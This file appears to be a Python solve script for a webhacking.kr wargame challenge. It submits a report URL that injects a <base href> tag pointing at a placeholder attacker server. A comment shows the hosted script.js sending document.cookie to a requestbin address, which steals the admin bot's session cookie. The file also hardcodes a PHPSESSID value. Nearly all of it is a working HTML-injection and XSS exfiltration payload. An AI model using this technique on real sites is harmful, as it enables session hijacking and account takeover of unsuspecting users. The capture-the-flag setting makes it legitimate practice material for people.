import requests

url = "http://webhacking.kr:10010/report.php"
cookie = {"PHPSESSID":"i3a6m2e00o7kgeo8vrfpg58j0s"}

def solve():
    # script.js -> document.location="[requestbin 주소]/?cookie="+document.cookie; -> 저장
    payload={"url":"?inject=<base href='http://[Attacker Server]'>"}
    res = requests.post(url, data=payload, cookies=cookie)
    if "reported! thank you!" in res.text:
        print("reported! thank you!")

if __name__ == "__main__":
    solve()
